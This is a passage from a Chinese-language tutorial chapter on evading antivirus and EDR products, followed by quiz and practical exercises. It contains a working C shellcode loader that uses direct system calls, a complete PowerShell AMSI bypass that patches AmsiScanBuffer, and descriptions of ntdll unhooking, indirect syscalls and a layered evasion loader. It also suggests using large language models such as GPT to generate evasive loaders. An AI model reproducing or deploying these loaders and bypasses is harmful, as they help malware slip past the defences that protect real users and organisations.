- 行为特征：API调用序列、行为模式
- 上下文：文件结构、资源、元数据

### 9.2 AI免杀思路

**怎么对抗AI检测？**

1. **对抗样本**
生成AI难以分类的样本。

2. **加入正常代码
加很多正常功能的代码，
降低恶意特征。

3. **改变结构
换一种实现方式，
偏离AI训练数据。

4. **AI生成免杀
用AI来生成免杀代码。

### 9.3 GPT生成免杀

**用大语言模型生成免杀：

现在已经有人用GPT等大模型生成免杀代码了。

**原理：**
- 让GPT写各种变形的加载器
- 生成不同的代码
- 测试哪些能过

**注意：**
这是双刃剑，
攻击方和防御方
都在用AI。

### 9.4 未来趋势

**免杀技术的发展趋势：

1. **更底层化**
   - 从用户态到内核态
   - 从Ring 3到Ring 0

2. **更隐蔽化**
   - 无文件、无进程、
   - 更难检测

3. **AI对抗化**
   - AI检测 vs AI免杀
   - 攻防双方都用AI

4. **合法工具滥用**
   - 用合法的工具做恶意的事
   - 比如LOLBins

---

## 💼 实战案例

### 案例1：直接系统调用实现Shellcode加载器

**场景：**
用直接系统调用实现一个简单的Shellcode加载器，
绕过用户态Hook。

**步骤：**

1. 生成Shellcode（msfvenom）
2. 用SysWhispers2生成系统调用代码
3. 写加载器
4. 编译测试

**核心代码：**

```c
// 使用SysWhispers2生成的代码
#include "syscalls.h"

unsigned char shellcode[] = { /* 加密的Shellcode */ };

int main() {
    // 1. 分配内存
    PVOID addr = NULL;
    SIZE_T size = sizeof(shellcode);
    
    NtAllocateVirtualMemory(
        (HANDLE)-1,
        &addr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    // 2. 拷贝Shellcode
    memcpy(addr, shellcode, sizeof(shellcode));
    
    // 3. 修改内存属性为可执行
    DWORD oldProtect;
    NtProtectVirtualMemory(
        (HANDLE)-1,
        &addr,
        &size,
        PAGE_EXECUTE_READ,
        &oldProtect
    );
    
    // 4. 创建线程执行
    HANDLE hThread = NULL;
    NtCreateThreadEx(
        &hThread,
        GENERIC_EXECUTE,
        NULL,
        (HANDLE)-1,
        addr,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );
    
    // 5. 等待线程
    NtWaitForSingleObject(hThread, FALSE, NULL);
    
    return 0;
}
```

**说明：**
- 全部用直接系统调用
- 不调用kernel32的API
- 绕过用户态Hook

---

### 案例2：Unhooking ntdll.dll

**场景：**
从磁盘加载干净的ntdll.dll，
覆盖内存中的，
去掉EDR的钩子。

**步骤：**

1. 读取磁盘上的ntdll.dll
2. 找到.text段
3. 覆盖内存中的ntdll.dll的.text段
4. 测试

**代码：**
前面4.4节的UnhookNtdll函数就是完整实现。

**效果：**
- EDR在ntdll里的Inline Hook被去掉了
- 后面再调用ntdll的函数就正常了
- EDR用户态监控失效

---

### 案例3：AMSI绕过

**场景：**
在PowerShell中执行恶意脚本，
绕过AMSI扫描。

**方法：**
Patch amsi.dll的AmsiScanBuffer函数。

**PowerShell代码：**
```powershell
# AMSI Bypass
# 仅用于学习研究

$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

# 加载amsi.dll
$hModule = [Win32]::LoadLibrary("amsi.dll")

# 获取AmsiScanBuffer地址
$addr = [Win32]::GetProcAddress($hModule, "AmsiScanBuffer")

# 修改内存保护
$oldProtect = 0
[Win32]::VirtualProtect($addr, [UIntPtr]::new(5), 0x40, [ref]$oldProtect)

# Patch: xor eax, eax; ret
$patch = [Byte[]] (0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 3)

# 恢复保护
[Win32]::VirtualProtect($addr, [UIntPtr]::new(5), $oldProtect, [ref]$oldProtect)
```

---

### 案例4：间接系统调用

**场景：**
用间接系统调用实现Shellcode执行，
让返回地址在ntdll.dll里。

**步骤：**

1. 在ntdll里找syscall指令地址
2. 设置系统调用号
3. 跳转到syscall指令
4. 执行

**效果：**
- 栈回溯显示返回地址在ntdll
- 更难被检测

---

### 案例5：综合免杀加载器

**场景：**
综合运用多种技术，
写一个完整的免杀加载器。

**技术组合：**
- Shellcode AES加密
- 间接系统调用
- 反调试
- 反沙箱
- 字符串加密
- 延迟执行
- 模拟正常行为

**架构：**

```
加密的Shellcode
  ↓
解密（AES）
  ↓
内存分配（间接系统调用）
  ↓
写入内存
  ↓
修改内存属性（间接系统调用）
  ↓
创建线程执行（间接系统调用）
```

**效果：**
- 静态扫描：加密了，扫不到
- 用户态Hook：间接系统调用绕过
- 行为检测：反调试反沙箱
- 内存扫描：执行完可以清理

---

## 📝 本章总结

::: tip 总结
这一章我们学习了
高级免杀技术，
这些是对抗EDR的核心手段。

**重点回顾：**

1. **系统调用基础**
   - 用户态 → 内核态的桥梁
   - ntdll.dll里的Native API
   - syscall指令

2. **直接系统调用**
   - 自己直接发syscall
   - 绕过用户态Hook
   - 但返回地址可疑

3. **间接系统调用**
   - 借ntdll的syscall指令
   - 返回地址在ntdll里
   - 更隐蔽

4. **Unhooking**
   - 从磁盘加载干净的dll
   - 覆盖内存中的
   - 去掉钩子

5. **AMSI绕过**
   - Patch AmsiScanBuffer
   - 让扫描永远返回干净

6. **ETW绕过**
   - Patch EtwEventWrite
   - 停止事件追踪

7. **EDR对抗体系**
   - 多层检测，多层绕过
   - 综合运用多种技术

8. **AI时代的免杀**
   - AI检测 vs AI免杀
   - 未来趋势

下一章我们会做
免杀模块的总结和回顾，
把整个免杀技术体系
串起来复习一遍。
:::

---

## 🎯 练习题

### 一、选择题（每题3分，共30分）

1. Windows系统调用在x64下使用什么指令进入内核？
   - A. int 0x2e
   - B. syscall
   - C. sysenter
   - D. int 3

2. 系统调用号在x64下存放在哪个寄存器？
   - A. rcx
   - B. rdx
   - C. eax
   - D. rbx

3. 直接系统调用的主要优势是什么？
   - A. 速度更快
   - B. 代码更简单
   - C. 绕过用户态Hook
   - D. 兼容性更好

4. 间接系统调用相比直接系统调用的优势是？
   - A. 实现更简单
   - B. 返回地址在ntdll.dll里，更难检测
   - C. 速度更快
   - D. 不需要系统调用号

5. Unhooking技术的目的是什么？
   - A. 加快程序运行速度
   - B. 去掉EDR放的钩子
   - C. 减小程序体积
   - D. 增加程序兼容性

6. AMSI的全称是什么？
   - A. Advanced Malware Scan Interface
   - B. Antimalware Scan Interface
   - C. Active Malware Security Interface
   - D. Antivirus Memory Scan Interface

7. 最常见的AMSI绕过方法是？
   - A. 删除amsi.dll文件
   - B. Patch AmsiScanBuffer函数
   - C. 关闭Windows更新
   - D. 卸载杀软

8. ETW的作用是什么？
   - A. 病毒扫描
   - B. 事件追踪
   - C. 防火墙
   - D. 入侵检测

9. 以下哪种不是EDR的检测手段？
   - A. 用户态Hook
   - B. 行为检测
   - C. 内核回调
   - D. 磁盘碎片整理

10. 以下关于AI免杀的说法，错误的是？
    - A. AI可以生成免杀代码
    - B. AI检测完全无法绕过
    - C. 对抗样本可以绕过AI检测
    - D. AI检测也有局限性

### 二、填空题（每题3分，共30分）

1. Windows中，所有用户态API最终都会调用\_\_\_\_\_\_\_\_里的Native API。

2. 直接系统调用绕过的是\_\_\_\_\_\_\_\_态的Hook。

3. Inline Hook通常修改函数开头的\_\_\_\_\_\_\_\_字节，改成跳转指令。

4. Unhooking最常用的方法是从\_\_\_\_\_\_\_\_加载干净的DLL覆盖内存中的。

5. AMSI的全称是\_\_\_\_\_\_\_\_。

6. ETW的全称是\_\_\_\_\_\_\_\_。

7. x64下系统调用的前四个参数分别放在\_\_\_\_\_\_\_\_、\_\_\_\_\_\_\_\_、\_\_\_\_\_\_\_\_、\_\_\_\_\_\_\_\_寄存器。

8. 间接系统调用的syscall指令从\_\_\_\_\_\_\_\_里发出。

9. EDR在内核中注册的，当进程创建时会被调用的叫\_\_\_\_\_\_\_\_。

10. 免杀技术的发展本质是攻击方和防御方的\_\_\_\_\_\_\_\_。

### 三、简答题（每题5分，共20分）

1. 简述直接系统调用和间接系统调用的区别和各自的优缺点。

2. 简述Inline Hook的工作原理和Unhooking的方法。

3. 简述AMSI的工作原理和常见的绕过方法。

4. 简述EDR的主要检测手段和对应的绕过思路。

### 四、实操题（每题10分，共20分）

1. 编写一个简单的直接系统调用Shellcode加载器（用C语言，使用SysWhispers2或类似工具），并测试效果。

2. 实现一个Unhook ntdll.dll的函数，从磁盘加载干净的ntdll.dll并覆盖内存中的.text段，验证是否成功。

---

::: tip 下章预告
下一章是
**第65章 总结与回顾：免杀模块**，
我们会把整个免杀技术体系
做一个全面的总结和回顾，
帮你把知识点
串起来，
形成完整的知识体系。
:::
